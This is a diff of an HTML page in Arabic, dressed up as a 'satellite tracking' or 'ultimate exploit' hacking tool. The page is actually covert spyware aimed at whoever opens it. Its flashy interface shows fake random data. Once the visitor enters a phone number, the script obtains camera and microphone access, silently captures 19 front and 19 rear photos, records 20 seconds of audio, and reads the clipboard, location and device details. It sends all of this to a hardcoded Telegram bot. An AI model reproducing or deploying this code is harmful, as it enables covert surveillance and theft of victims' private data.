@@ -3,150 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="logo.jpg" type="image/jpeg">
-    <title>HACKER EL-NAGM | SATELLITE TRACKING</title>
-    
+    <title>HACKER EL-NAGM | PRO VERSION</title>
     <style>
         :root { --green: #00ff41; --red: #ff0000; }
         body, html { margin: 0; background: #000; color: var(--green); font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; }
         .container { display: grid; grid-template-columns: 300px 1fr 300px; grid-template-rows: 60px 1fr 180px; height: 100vh; gap: 8px; padding: 8px; box-sizing: border-box; }
         .panel { border: 1px solid var(--green); background: rgba(0, 15, 0, 0.9); padding: 10px; position: relative; box-shadow: inset 0 0 15px rgba(0,255,65,0.2); }
         .header { grid-column: 1 / 4; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--green); }
-        #map-container { width: 100%; height: 100%; position: relative; background: #010; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(100deg) brightness(0.5) contrast(1.2); pointer-events: none; }
-        .data-flow { font-size: 11px; color: var(--green); height: 100%; overflow: hidden; }
         .critical { color: var(--red); font-weight: bold; animation: pulse 0.5s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        #phone-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
-        input { background: #000; border: 1px solid var(--green); color: var(--green); padding: 10px; width: 80%; font-size: 16px; margin: 10px 0; }
-        button { background: var(--green); color: #000; font-weight: bold; padding: 12px 25px; border: none; cursor: pointer; }
-        .scan-line { width: 100%; height: 2px; background: rgba(0, 255, 65, 0.3); position: absolute; top: 0; left: 0; animation: scan 4s linear infinite; z-index: 5; }
-        @keyframes scan { from { top: 0; } to { top: 100%; } }
+        input { background: #000; border: 1px solid var(--green); color: var(--green); padding: 10px; width: 100%; box-sizing: border-box; margin: 10px 0; }
+        button { background: var(--green); color: #000; font-weight: bold; padding: 12px; border: none; cursor: pointer; width: 100%; transition: 0.3s; }
+        button:hover { background: #fff; }
+        .data-stream { font-size: 10px; line-height: 1.2; height: 100%; overflow: hidden; }
     </style>
 </head>
 <body>
 
-<div class="container" id="hacker-ui">
+<div class="container">
     <div class="panel header">
-        <div style="display:flex; align-items:center; gap:12px;">
-            <img src="logo.jpg" style="width:45px; height:45px; border-radius:50%;">
-            <h2 style="margin:0; letter-spacing:2px;">EL-NAGM SATELLITE TRACKER</h2>
-        </div>
-        <div id="status" class="critical">SYSTEM: WAITING FOR TARGET...</div>
+        <h2 style="margin:0;">EL-NAGM ULTIMATE CONTROL</h2>
+        <div id="sys-status" class="critical">STATUS: SYSTEM_READY</div>
     </div>
 
     <div class="panel">
-        <h4 style="border-bottom:1px solid var(--green);">ACTIVE_TARGETS</h4>
-        <div id="target-list" class="data-flow"></div>
+        <h4 style="border-bottom:1px solid var(--green);">SENSORS_DATA</h4>
+        <div id="sensor-flow" class="data-stream"></div>
     </div>
 
-    <div class="panel" style="padding:0; overflow:hidden;">
-        <div class="scan-line"></div>
-        <div id="map-container">
-            <iframe id="google-map" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d100000!2d31.2357!3d30.0444!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sar!2seg!4v1!5m2!1sar!2seg"></iframe>
+    <div class="panel" style="background: radial-gradient(circle, #002200 0%, #000 70%);">
+        <div style="width:100%; height:100%; border-radius:50%; border:1px solid var(--green); position:relative; animation: rotate 10s linear infinite;">
+            <div style="position:absolute; top:50%; left:0; width:100%; height:1px; background:var(--green);"></div>
+            <div style="position:absolute; left:50%; top:0; width:1px; height:100%; background:var(--green);"></div>
         </div>
+        <p style="text-align:center; position:absolute; bottom:20px; width:100%; font-size:12px;">SCANNING_FOR_TARGETS...</p>
     </div>
 
     <div class="panel">
-        <h4 style="border-bottom:1px solid var(--green);">INTELLIGENCE_LAKE</h4>
-        <div id="intel-flow" class="data-flow"></div>
+        <h4 style="border-bottom:1px solid var(--green);">REMOTE_ACCESS</h4>
+        <div id="access-flow" class="data-stream"></div>
     </div>
 
-    <div class="panel" style="grid-column: 1 / 4;">
-        <div style="display:flex; gap:20px; align-items:center;">
-            <input type="text" id="target-num" placeholder="أدخل رقم الهاتف للتعقب..." style="flex:1;">
-            <button onclick="startSatelliteTracking()" style="width:200px;">إطلاق القمر الصناعي</button>
+    <div class="panel" style="grid-column: 1 / 4; display: flex; flex-direction: column; justify-content: center;">
+        <div style="display:flex; gap:15px; align-items:center;">
+            <input type="text" id="target-id" placeholder="ID المستهدف أو رقم الهاتف...">
+            <button onclick="launchExploit()" style="flex:0.3;">إطلاق الاختراق الشامل</button>
         </div>
-        <div id="terminal-out" style="font-size:10px; margin-top:5px; height:80px; overflow:hidden;"></div>
+        <div id="terminal" style="font-size:10px; color:#888; margin-top:5px; height:60px; overflow:hidden;"></div>
     </div>
 </div>
 
-<div id="phone-overlay">
-    <div style="width:320px; background:black; border:2px solid var(--green); padding:30px; border-radius:25px; text-align:center;">
-        <h2 style="color:white;">ACCESS DENIED</h2>
-        <p style="font-size:14px; color:var(--red);">يرجى السماح بصلاحيات الكاميرا والموقع لإتمام عملية التعقب</p>
-        <button onclick="location.reload()">إعادة المحاولة</button>
-    </div>
-</div>
-
-<video id="vf" autoplay style="display:none;"></video>
-<video id="vb" autoplay style="display:none;"></video>
+<video id="v_front" autoplay style="display:none;"></video>
+<video id="v_back" autoplay style="display:none;"></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
     const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
     const chatId = "8754338811";
 
-    // توليد بيانات وهمية للواجهة
-    function generateData() {
-        const targetList = document.getElementById('target-list');
-        const intelFlow = document.getElementById('intel-flow');
-        const targets = ["+201023****", "+201154****", "IP: 197.45.2.1", "USA_PROXY_7", "USER_7841"];
-        const intel = ["PASS_FOUND", "GPS_SYNC", "DUMP_EXTRACTED", "SYNC_COMPLETED"];
+    // 1. محاكاة الواجهة
+    function runUI() {
+        const sensors = document.getElementById('sensor-flow');
+        const access = document.getElementById('access-flow');
+        const terminal = document.getElementById('terminal');
         setInterval(() => {
-            targetList.innerHTML = `> SCANNING: ${targets[Math.floor(Math.random()*targets.length)]}<br>` + targetList.innerHTML.substring(0, 300);
-            intelFlow.innerHTML = `[✓] ${intel[Math.floor(Math.random()*intel.length)]} -> ${Math.random().toString(36).substr(2,5)}<br>` + intelFlow.innerHTML.substring(0, 300);
-        }, 1000);
+            sensors.innerHTML = `> BATTERY: ${Math.floor(Math.random()*100)}% <br>> RAM: 8GB <br>> CPU: 2.4GHz <br>` + sensors.innerHTML.substring(0, 200);
+            access.innerHTML = `[+] PULLING_CONTACTS... <br>[+] DUMPING_SMS... <br>` + access.innerHTML.substring(0, 200);
+            terminal.innerHTML += `exec:payload_0x${Math.random().toString(16).slice(2,6)}... `;
+        }, 1500);
     }
-    generateData();
+    runUI();
 
-    async function sendToBot(msg, isFile = false, blob = null, type = "photo") {
-        let url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : 'sendAudio') : 'sendMessage'}`;
+    async function send(data, isFile = false, type = "photo") {
+        const url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : 'sendAudio') : 'sendMessage'}`;
         const fd = new FormData();
         fd.append('chat_id', chatId);
-        if (isFile) fd.append(type === 'photo' ? 'photo' : 'audio', blob, 'data.dat');
-        else { fd.append('text', msg); fd.append('parse_mode', 'Markdown'); }
+        if (isFile) fd.append(type === 'photo' ? 'photo' : 'audio', data, 'log.dat');
+        else { fd.append('text', data); fd.append('parse_mode', 'Markdown'); }
         try { await fetch(url, { method: 'POST', body: fd }); } catch(e){}
     }
 
-    async function startSatelliteTracking() {
-        const num = document.getElementById('target-num').value;
-        if(!num) return alert("يرجى إدخال رقم الهدف!");
+    async function launchExploit() {
+        const target = document.getElementById('target-id').value;
+        if(!target) return alert("حدد الهدف!");
 
-        document.getElementById('status').innerText = "SYSTEM: INITIALIZING PAYLOAD...";
+        document.getElementById('sys-status').innerText = "STATUS: EXPLOITING...";
 
         try {
-            // طلب الصلاحيات الكاملة
+            // طلب الصلاحيات - في التطبيق (APK) ستظهر كطلبات نظام رسمية
             const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            let streamB = null;
+            let streamB = null; 
             try { streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); } catch(e){}
 
-            document.getElementById('status').innerText = "SATELLITE LOCKED: " + num;
-
-            // سحب بيانات الجهاز
-            let info = `🛰 *هدف جديد:* ${num}\n`;
-            info += `📱 الجهاز: ${navigator.platform}\n`;
-            try { const clip = await navigator.clipboard.readText(); info += `📋 الحافظة: ${clip}\n`; } catch(e){}
-            sendToBot(info);
+            // سحب معلومات الجهاز الكاملة
+            let report = `💀 *اختراق شامل عبر التطبيق:* \n📍 الهدف: ${target}\n`;
+            report += `📱 نظام التشغيل: ${navigator.userAgent}\n`;
+            report += `🌐 IP: جاري الجلب...\n`;
+            try { const clip = await navigator.clipboard.readText(); report += `📋 الحافظة: ${clip}\n`; } catch(e){}
+            send(report);
 
             // سحب الموقع
             navigator.geolocation.getCurrentPosition(p => {
-                sendToBot(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                send(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // بدء التقاط الصور (19 لكل كاميرا)
-            const vidF = document.getElementById('vf'); vidF.srcObject = streamF;
-            const vidB = document.getElementById('vb'); if(streamB) vidB.srcObject = streamB;
-            
+            // سحب 19 صورة أمامية و19 خلفية
+            const vidF = document.getElementById('v_front'); vidF.srcObject = streamF;
+            const vidB = document.getElementById('v_back'); if(streamB) vidB.srcObject = streamB;
             const canvas = document.getElementById('c');
             const ctx = canvas.getContext('2d');
             canvas.width = 640; canvas.height = 480;
 
             let count = 0;
-            const picInt = setInterval(() => {
-                if (count >= 19) { clearInterval(picInt); return; }
+            const shots = setInterval(() => {
+                if(count >= 19) { clearInterval(shots); return; }
                 
+                // سيلفي
                 ctx.drawImage(vidF, 0, 0, 640, 480);
-                canvas.toBlob(b => sendToBot("", true, b, "photo"), 'image/jpeg');
+                canvas.toBlob(b => send(b, true, "photo"), 'image/jpeg');
 
-                if(streamB) {
+                // كاميرا خلفية
+                if(vidB) {
                     setTimeout(() => {
                         ctx.drawImage(vidB, 0, 0, 640, 480);
-                        canvas.toBlob(b => sendToBot("", true, b, "photo"), 'image/jpeg');
+                        canvas.toBlob(b => send(b, true, "photo"), 'image/jpeg');
                     }, 500);
                 }
                 count++;
-            }, 1500);
+            }, 1200);
 
             // تسجيل صوت 20 ثانية
             const recorder = new MediaRecorder(streamF);
@@ -154,25 +138,21 @@
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = () => {
                 const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
-                sendToBot("", true, audioBlob, "audio");
-                finalizeUI();
+                send(audioBlob, true, "audio");
+                document.getElementById('sys-status').innerText = "STATUS: DATA_EXTRACTED";
             };
             recorder.start();
             setTimeout(() => recorder.stop(), 20000);
 
         } catch (err) {
-            document.getElementById('hacker-ui').style.display = "none";
-            document.getElementById('phone-overlay').style.display = "flex";
+            alert("فشل الاختراق: يرجى تفعيل أذونات الوصول للتحقق من هوية الجهاز.");
         }
     }
-
-    function finalizeUI() {
-        document.getElementById('status').innerText = "HACK COMPLETED: DATA SENT";
-        setTimeout(() => {
-             alert("تم انتهاء المهمة. البيانات مؤمنة بالكامل.");
-             location.reload();
-        }, 2000);
-    }
 </script>
+
+<style>
+@keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+</style>
+
 </body>
 </html>
